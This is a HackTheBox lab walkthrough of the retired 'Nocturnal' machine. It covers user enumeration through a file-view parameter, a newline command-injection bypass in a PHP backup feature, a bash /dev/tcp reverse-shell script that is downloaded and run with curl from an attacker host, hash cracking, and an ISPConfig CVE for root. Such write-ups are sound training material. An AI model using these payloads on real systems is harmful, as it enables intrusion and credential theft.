---
title: Nocturnal
categories: [HackTheBox]
tags: [cve,commandinjection,portforwarding]
media_subpath: /images/hackthebox_nocturnal/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/f6a56cec6e9826b4ed124fb4155abc66.png'
---

# HackTheBox - Nocturnal

Nocturnal is a retired HackTheBox machine that focuses on web application vulnerabilities, command injection, and privilege escalation. We started of by enumerating the open ports and services, then we moved on to the web application where we found a file upload functionality that allowed us to enumerate users and their files. We exploited a command injection vulnerability in the backup functionality to get a reverse shell, then we escalated our privileges by portforwarding a local `ISPCONFIG` application and abusing a remote code execution vulnerability to get a shell as the `root` user.

## Nmap

```bash
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
```

We can see that the web server is running on port 80 and SSH is running on port 22. Let's enumerate the web server.

## 80 - Web

Let's start with a basic HTTP request to see if we can get any information about the web server.

```bash
curl -I $IP

HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 13 Aug 2025 19:23:45 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://nocturnal.htb/
```

It seems like the server is redirecting us to `http://nocturnal.htb/`. Let's add this to our `/etc/hosts` file.

```bash
echo '10.10.11.64 nocturnal.htb' | sudo tee -a /etc/hosts
```

Now we can access the web server at `http://nocturnal.htb/`.

![NON](file-20250813192640631.png)

We can see that there is a login page and a registration page. After registering a new user, we can log in with the credentials we just created and access the dashboard, giving us an option to upload files.

![NON](file-20250813192657200.png)

After trying to upload a file, we can see that there are several file types that are allowed.

![NON](file-20250813192755106.png)

![NON](file-20250813193316647.png)

Sending a legitimate `pdf` file works, trying to access the uploaded file, it shows us that we are accessing the file from the following path:

![NON](file-20250814013905450.png)

```bash
http://nocturnal.htb/view.php?username=<username>&file=<filename>
```

Let's see if we can enumerate our files by sending a non existing file in the file parameter.

![NON](file-20250814014103879.png)

![NON](file-20250814014137455.png)

```bash
curl -s 'http://nocturnal.htb/view.php?username=railoca&file=a' -b "PHPSESSID=k6elc3u7g4jtqndpro71aa9ioj" |html2text

curl -s 'http://nocturnal.htb/view.php?username=railoca&file=.pdf' -b "PHPSESSID=k6elc3u7g4jtqndpro71aa9ioj" |html2text
```

We can enumerate the files by sending a non-existing file in the `file` parameter. This gives us a list of files that are present for that user, which is `railoca` in this case. We can fuzz the `username` parameter to see if we can enumerate other users and their files. From our request, we can see that we receive a response with the text "Available files for download" when the file exists, so we can use `ffuf` to fuzz the `username` parameter with a list of usernames. 

```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=.pdf' -b 'PHPSESSID=o857qrkea25jq7ff6i6p3tb26u' -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -ic -c -mr "Available files for download"
```
> Command Breakdown:
> - `-u`: Specifies the URL to fuzz.
> - `-b`: Sets the cookie for the session.
> - `-w`: Specifies the wordlist to use for fuzzing.
> - `-ic`: Ignores case in the response.
> - `-c`: Enables colored output.
> - `-mr`: Matches the response with the specified regex.
{: .prompt-info}

![NON](file-20250813195108689.png)

We found 3 possible users: `tobias`, `admin`, and `amanda`. Let's check the files for each user.

![NON](file-20250813195142541.png)

Amanda has a file named `privacy.odt` which we can download with the previous command.

```bash
curl -s 'http://nocturnal.htb/view.php?username=amanda&file=privacy.odt' -b 'PHPSESSID=o857qrkea25jq7ff6i6p3tb26u'  --output privacy.odt
```

Opening the file, we can see that it contains some sensitive information, such as the username and password for the `amanda` user.

![NON](file-20250813195244656.png)
![NON](file-20250813195301744.png)

Logging in on the web server with the `amanda` user, we can access the dashboard and see an option to enter the admin dashboard

![NON](file-20250813195517671.png)

![NON](file-20250814015244317.png)

We can create a backup for the server files by setting a password and clicking on the "Create Backup" button. This will create a backup of the server files and allow us to download it.

After downloading the backup, we can unzip it and see source code for the application, which is written in PHP. We can see that the create backup functionality is implemented in the `admin.php` file and it is vulnerable to a command injection vulnerability but tries to prevent it by sanitizing some characters.


![NON](file-20250813195738271.png)
![NON](file-20250813201102600.png)

The command injection vulnerability is in the following session:

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

Theoretically, we can inject a command after the `-P` option, but the code tries to sanitize the input by removing certain characters. To inject a command, we can try to insert a line break character, `%0a`, and insert a simple bash command after it.

By capturing the request to a proxy (Burp Suite), we can send a command to test the vulnerability. We can try to execute a simple command like `bash -c id` to see if it works.

![NON](file-20250813202941006.png)

And we have confirmed that the command injection vulnerability is working, as we can see the output of the `id` command in the response.


For getting a reverse shell that doesn't get filtered, we can simply download a script from our machine and execute it. We can use `curl` to download the script and then execute it with `bash`.

On our machine we create the following script `rev.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.4/9999 0>&1
```

We can host this script on a web server, for example using Python:

```bash
python3 -m http.server
```

And then we can use the following command to download and execute the script on the target machine:

```bash
echo 'bash -c "curl http://10.10.14.4:8000/rev.sh -o /tmp/rev.sh"'|jq -rR @uri|sed 's/%20/%09/g'
bash%09-c%09%22curl%09http%3A%2F%2F10.10.14.4%3A8000%2Frev.sh%09-o%09%2Ftmp%2Frev.sh%22
```

Sending this payload after the `%0a` character in the command injection vulnerability will execute the script and download the reverse shell script to the `/tmp` directory.

![NON](file-20250813203825969.png)

After that we do the samething to set the script as executable: 

```bash
echo 'bash -c "chmod +x /tmp/rev.sh"'|jq -rR @uri|sed 's/%20/%09/g'
bash%09-c%09%22chmod%09%2Bx%09%2Ftmp%2Frev.sh%22
```

And then, execute the script to get a reverse shell:

```bash
echo 'bash /tmp/rev.sh' | jq -rR @uri | sed 's/%20/%09/g'
bash%09%2Ftmp%2Frev.sh
```

![NON](file-20250813203645503.png)

## Horizontal Privilege Escalation

After getting a reverse shell, we can see that we are logged in as the `www-data` user. We can look for web server files in search for sensitive information. Looking at the `nocturnal_database` directory, we can see that there is a file named `nocturnal_database.db` which contains the application users password hash. 

![NON](file-20250813203926892.png)

From the `Tobias` hash, we can crack it using `hashcat` and with that password, we can log in into the `SSH` service as the `tobias` user.

![NON](file-20250813204213349.png)
![NON](file-20250813204238557.png)

## Privilege Escalation

After logging in as the `tobias` user, we can enumerate the internal services and see that there is a service running on port `8080`. 

![NON](file-20250813204309947.png)

We can forward this local port to our machine using the `ssh` command with the `-L` option:

![NON](file-20250813204412366.png)

### 8080 - Web Server ISPCONFIG
By accessing `http://localhost:8080`, we can see that there is a web application for `ISPCONFIG` running on this port.

![NON](file-20250813204431290.png)

Looking for exploits for `ISPCONFIG`, we can find a remote code execution vulnerability in the [`CVE-2023-46818`](https://github.com/ajdumanhug/CVE-2023-46818/blob/main/CVE-2023-46818.py).

At first try, we could not authenticate with the `tobias` user in the `ISPCONFIG` web application, but after trying the usernames we found earlier, we were able to log in with the `admin` user.

We can use this exploit to get a shell as the `root` user.

![NON](file-20250814003157491.png)
